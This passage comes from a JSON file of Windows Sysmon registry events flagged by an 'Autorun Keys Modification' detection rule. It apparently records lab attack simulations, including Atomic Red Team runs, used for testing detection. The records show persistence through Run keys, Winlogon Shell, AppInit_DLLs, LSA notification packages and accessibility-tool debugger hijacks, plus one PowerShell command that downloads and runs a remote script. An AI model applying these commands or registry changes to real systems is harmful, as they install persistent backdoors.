		"threadid":3800,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-08T21:42:01.653030Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":7187,
		"image":"C:\\Windows\\system32\\mmc.exe",
		"processguid":"747F3D96-3AAD-5F06-0000-001004942C00",
		"processid":2268,
		"utctime":"2020-07-08 21:43:13.786",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":308055,
		"threadid":3800,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-08T21:43:13.791715Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":430,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"365ABB72-6F5D-5D0A-0000-00109B331300",
		"processid":284,
		"utctime":"2019-06-19 17:22:41.709",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":13,
		"eventrecordid":8034,
		"threadid":2076,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-06-19T17:22:41.709638Z",
		"version":2,
		"details":"DWORD (0x00000200)",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\GlobalFlag"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":662,
		"image":"C:\\Users\\IEUser\\Downloads\\a.exe",
		"processguid":"365ABB72-1E19-5D04-0000-0010DFC60A00",
		"processid":1960,
		"utctime":"2019-06-14 22:22:21.519",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":13,
		"eventrecordid":7532,
		"threadid":288,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-06-14T22:22:21.535245Z",
		"version":2,
		"details":"\"C:\\Users\\IEUser\\AppData\\Roaming\\9QxTsAU9w8gyPj4w\\BRE6BgE2JubB.exe\",explorer.exe",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3583694148-1414552638-2922671848-1000\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
		"rulename":"Persistence - Winlogon Shell"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":896,
		"image":"C:\\Users\\Public\\tools\\apt\\tendyron.exe",
		"processguid":"747F3D96-4BCE-5F88-0000-001070544D00",
		"processid":3368,
		"utctime":"2020-10-15 13:17:02.706",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":416056,
		"threadid":4748,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-10-15T13:17:02.736849Z",
		"version":2,
		"details":"C:\\Users\\Public\\tools\\apt\\tendyron.exe",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Tendyron"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":1823,
		"image":"C:\\Windows\\system32\\wbem\\wmiprvse.exe",
		"processguid":"747F3D96-041E-5FD2-0000-001024DF3B00",
		"processid":3556,
		"utctime":"2020-12-10 11:18:54.853",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":549609,
		"threadid":4972,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-12-10T11:18:54.856311Z",
		"version":2,
		"details":"rundll32.exe a.dll, DllMain",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\wmipers"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3803,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:17.579",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311354,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:00:17.591137Z",
		"version":2,
		"details":"c:\\windows\\system32\\notepad.exe\\1",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3804,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:17.579",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311355,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:00:17.591169Z",
		"version":2,
		"details":"a",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3810,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:31.172",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311361,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:00:31.218022Z",
		"version":2,
		"details":"a",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3816,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:45.579",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311367,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:00:45.590589Z",
		"version":2,
		"details":"cmd.exe\\1",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\b"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3817,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:45.579",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311368,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:00:45.590736Z",
		"version":2,
		"details":"ba",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3824,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:01:03.893",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311375,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:01:03.900433Z",
		"version":2,
		"details":"powershell.exe\\1",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\c"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3825,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:01:03.893",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311376,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:01:03.902259Z",
		"version":2,
		"details":"cba",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3833,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-09 22:06:20.180",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311387,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:06:20.185045Z",
		"version":2,
		"details":"eventvwr\\1",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\d"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3834,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-09 22:06:20.180",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":311388,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2020-07-09T22:06:20.185107Z",
		"version":2,
		"details":"dcba",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3869,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D765-5D31-0000-001086B92800",
		"processid":2796,
		"utctime":"2019-07-19 14:44:53.261",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3595,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:44:53.292455Z",
		"version":2,
		"details":"C:\\Path\\AtomicRedTeam.exe",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic Red Team",
		"rulename":"Persistence - via Run key"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3876,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D772-5D31-0000-001010E82800",
		"processid":2796,
		"utctime":"2019-07-19 14:45:06.150",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3602,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:45:06.161409Z",
		"version":2,
		"details":"C:\\Path\\AtomicRedTeam.dll",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\\1",
		"rulename":"Persistence - via Run key"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3881,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-D6F7-5D31-0000-00104ACE2500",
		"processid":2796,
		"utctime":"2019-07-19 14:45:19.416",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3607,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:45:19.483250Z",
		"version":2,
		"details":"powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun",
		"rulename":"Persistence - via Run key"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3906,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-D6F7-5D31-0000-00104ACE2500",
		"processid":2796,
		"utctime":"2019-07-19 14:47:21.917",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3632,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:47:21.972037Z",
		"version":2,
		"details":"Binary Data",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Notification Packages",
		"rulename":"Persistence or CredAccess - Lsa NotificationPackge"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3909,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D809-5D31-0000-00105C262B00",
		"processid":2796,
		"utctime":"2019-07-19 14:47:37.136",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3635,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:47:37.147054Z",
		"version":2,
		"details":"C:\\Tools\\MessageBox64.dll,C:\\Tools\\MessageBox32.dll",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
		"rulename":"Persistence - AppInit"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3910,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D809-5D31-0000-00105C262B00",
		"processid":2796,
		"utctime":"2019-07-19 14:47:37.136",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3636,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:47:37.168863Z",
		"version":2,
		"details":"DWORD (0x00000001)",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs",
		"rulename":"Persistence - via Windows Load"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":4005,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D89A-5D31-0000-0010F56D3200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:02.212",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3731,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:02.220426Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":4009,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D89F-5D31-0000-0010BD7F3200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:07.307",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3735,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:07.322063Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":4013,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D8A2-5D31-0000-0010D5913200",
		"processid":2796,
		"utctime":"2019-07-19 14:50:10.275",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":3739,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:50:10.295724Z",
		"version":2,
		"details":"C:\\windows\\system32\\cmd.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger",
		"rulename":"Persistence - IFEO Debugger ValueSet"
	},
